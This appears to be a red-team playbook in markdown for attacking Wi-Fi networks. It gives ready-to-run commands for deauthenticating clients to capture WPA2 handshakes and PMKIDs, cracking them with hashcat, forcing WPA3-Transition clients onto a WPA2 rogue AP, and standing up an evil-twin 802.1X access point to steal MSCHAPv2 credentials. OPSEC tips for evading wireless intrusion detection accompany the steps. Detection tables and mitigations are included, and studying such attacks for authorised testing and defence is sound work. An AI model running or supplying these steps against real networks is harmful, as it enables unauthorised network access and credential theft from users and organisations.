# Wireless Attacks — WPA2, WPA3, Evil Twin, 802.1X

Wi-Fi as the network entry vector: capture/crack WPA2, downgrade WPA3-Transition,
evil-twin WPA-Enterprise credential theft. All driven by `scripts/wifi_attack.sh`.

---

## 0. Setup

```bash
sudo bash scripts/wifi_attack.sh mon-up wlan0      # airmon-ng check kill + monitor mode
sudo bash scripts/wifi_attack.sh scan wlan0mon     # note RSN AKM: SAE=WPA3, PSK=WPA2
```
In `airodump-ng`, the **AKM** column tells you the target class: `PSK` = WPA2,
`SAE` = WPA3-only, **both `PSK`+`SAE` = WPA3-Transition (downgrade-vulnerable)**.

---

## 1. WPA2-PSK — handshake / PMKID capture → offline crack

### Theory
WPA2-PSK derives the PMK from the passphrase+SSID. Capturing the **4-way handshake**
(or a single **PMKID** from the AP, clientless) yields material for an offline
dictionary/brute attack — no rate limit, no lockout.

```bash
# Handshake capture (deauth a client to force a re-handshake):
sudo bash scripts/wifi_attack.sh wpa2 wlan0mon <BSSID> <CHANNEL> capture
#   -> capture-01.cap ; convert + crack:
hcxpcapngtool -o capture.hc22000 capture-01.cap
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt -r best64.rule

# Clientless PMKID (no deauth, stealthier — works on PMKID-caching APs):
sudo bash scripts/wifi_attack.sh pmkid wlan0
#   hcxdumptool -> pmkid.pcapng -> hcxpcapngtool -o pmkid.hc22000 -> hashcat -m 22000
```
- **Detection:** deauth frames (mgmt) are flagged by WIDS/WIPS (Kismet, vendor). PMKID
  capture is passive/quiet (no deauth). **OPSEC:** keep deauth bursts short and target
  one client MAC (`-c <client>`), not broadcast. 802.11w (MFP) blocks deauth — then
  rely on PMKID or wait for organic association.

---

## 2. WPA3-Transition downgrade (Dragonblood) ★ current (2024-2025 reproductions)

### Theory
WPA3-**Transition mode** lets an AP serve both **WPA3-SAE** and **WPA2-PSK** under the
*same passphrase* for backward compatibility. The SAE→WPA2 negotiation is **not
cryptographically protected**, so an attacker stands up a **WPA2-only rogue AP** on the
victim SSID; WPA3 clients fall back to WPA2, leaking a **crackable 4-way handshake**.
This is the practical, current offshoot of the 2019 Dragonblood research
(CVE-2019-9494..9499); TrustedSec (Jul 2024) reproduced it against Aruba/Ubiquiti/
MikroTik/Cisco Meraki, RedLegg (Jun 2025) against real engagements with eaphammer.

### Attack (this skill's driver)
```bash
# Stand up the WPA2-only rogue AP on the victim SSID (forces downgrade):
sudo bash scripts/wifi_attack.sh wpa3dg wlan0 wlan1mon "CorpWiFi" 6
#   1) capture: airodump-ng wlan1mon --essid "CorpWiFi" -w wpa3dg
#   2) deauth a real client off the legit WPA3 AP -> it re-associates to your WPA2 AP
#   3) crack the captured WPA2 handshake: hashcat -m 22000 wpa3dg.hc22000 wordlist.txt

# Automated alternatives:
python3 dragon.py            # DragonShift — fingerprints PSK+SAE APs w/ MFP inactive, auto rogue+capture
eaphammer --essid CorpWiFi --channel 6 --auth wpa-psk --negotiate balanced
```
- **Vulnerable signature:** AP advertises **both PSK and SAE** with **MFP (802.11w)
  inactive** — DragonShift fingerprints exactly this. WPA3-**only** + MFP-required is
  not downgradeable.
- **Detection:** WIPS sees a second BSSID broadcasting the protected SSID; deauths
  against WPA3 clients. **OPSEC:** the rogue AP is a loud, persistent beacon — short
  windows only. **Mitigation to report:** enable **Transition Disable** (mandatory on
  WPA3-certified gear since Dec 2020) or move to WPA3-only with MFP required.

---

## 3. Evil Twin — WPA-Enterprise (802.1X) credential capture

### Theory
WPA-Enterprise uses 802.1X/EAP to a RADIUS server. Stand up a rogue AP + rogue RADIUS
(hostapd-wpe / eaphammer) on the same SSID with stronger signal; clients using
PEAP/EAP-TTLS-MSCHAPv2 hand over the **MSCHAPv2 challenge/response**, crackable
offline to the password (or directly to the NT hash via the MSCHAPv2→DES weakness).

```bash
sudo bash scripts/wifi_attack.sh eviltwin wlan0 "CorpWiFi" 6
#   eaphammer: --auth wpa-eap --creds --negotiate balanced  (auto-downgrades EAP)
#   hostapd-wpe alternative -> crack captured MSCHAPv2:
asleap -C <challenge> -R <response> -W wordlist.txt
hashcat -m 5500 captured_netntlm.txt wordlist.txt        # NetNTLMv1 / MSCHAPv2
# MSCHAPv2 challenge can also be cracked to the NT hash deterministically (crack.sh DES).
```
- **EAP downgrade:** eaphammer's `--negotiate balanced/weakest` pushes clients to the
  most attackable EAP method (often MSCHAPv2).
- **Detection:** rogue BSSID for a known enterprise SSID; clients seeing a server cert
  that fails validation (if clients validate the RADIUS cert — many don't, which is the
  whole vulnerability). **OPSEC:** clients with proper **server-cert validation +
  CA pinning** won't submit creds — the attack relies on misconfigured supplicants.
  **Mitigation to report:** enforce server-certificate validation + EAP-TLS (cert auth,
  no password to steal).

---

## 4. Cracking & cloud notes
```bash
# WPA2/PMKID/MSCHAPv2 all reduce to hashcat:
hashcat -m 22000 capture.hc22000 wl.txt -r rules/best64.rule       # WPA2/PMKID
hashcat -m 5500  netntlm.txt      wl.txt                            # MSCHAPv2/NetNTLMv1
# crack.sh for NTLMv1/MSCHAPv2 (DES) -> deterministic NT-hash recovery.
```

---

## Detection summary (this cluster)
| Technique | IOC | Detection |
|---|---|---|
| Deauth-driven capture | mgmt deauth flood | WIDS deauth alerts; 802.11w/MFP blocks it |
| PMKID capture | none (passive) | very low — disable PMKID/roaming caching on AP |
| WPA3-Transition downgrade | 2nd BSSID for SSID, PSK+SAE+MFP-off | WIPS rogue-AP; Transition Disable |
| Evil-twin 802.1X | rogue BSSID, RADIUS cert mismatch | WIPS; client server-cert validation |

## OPSEC (this cluster)
- All wireless attacks are RF-local and detectable by enterprise **WIPS** (rogue-AP,
  deauth, RSSI anomalies). Prefer passive (PMKID, organic capture) before active
  (deauth, rogue AP). Rogue APs broadcast continuously — minimize on-air time.
- No host artifacts; all loot is on the attacker. Power down rogue APs / restore
  monitor iface (`airmon-ng stop wlan0mon`) on completion.

## References
- TrustedSec (Jul 2024) WPA3 transition-mode downgrade reproduction (Aruba/Ubiquiti/
  MikroTik/Meraki).
- RedLegg (Jun 2025) "Transition Trap: Why WPA3 Isn't Bulletproof Against an Evil Twin
  Attack" (eaphammer).
- jabbaw0nky/DragonShift (`dragon.py`) GitHub — automated WPA3-Transition downgrade.
- Vanhoef & Ronen, "Dragonblood" (2019) — CVE-2019-9494..9499, CERT VU#871675.
- s0lst1c3/eaphammer; hostapd-wpe; hashcat -m 22000 (WPA-PBKDF2/PMKID).
- MITRE ATT&CK T1557 (AiTM), T1040 (Network Sniffing), T1110 (Brute Force / offline
  crack), T1556 (rogue auth / cred capture).
